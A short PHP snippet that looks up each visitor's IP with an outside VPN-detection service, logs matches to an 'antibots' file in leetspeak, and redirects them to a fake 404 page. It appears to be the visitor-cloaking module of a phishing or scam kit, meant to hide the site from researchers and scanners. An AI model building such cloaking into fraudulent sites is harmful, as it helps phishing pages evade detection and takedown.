<?php



if ($block_vpn == "on") {

    $ip = getIP();
    $DheReckahApi = "https://blackbox.ipinfo.app/lookup/". $ip;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $DheReckahApi);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $answer = curl_exec($ch);
    curl_close($ch);

    if (!is_localhost($ip) && ($answer == "Y" or $answer == "y")) {
        $message = ("VPN D3cl!n3d =>  [ V9N ] :".$_SERVER['HTTP_USER_AGENT']."\n !p: ". $ip." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
            $save=fopen("antibots/DiscoveredBot.txt","a+");
            fwrite($save,$message);
            fclose($save);
            header("Location: ./404.php");exit();
    }
}
?>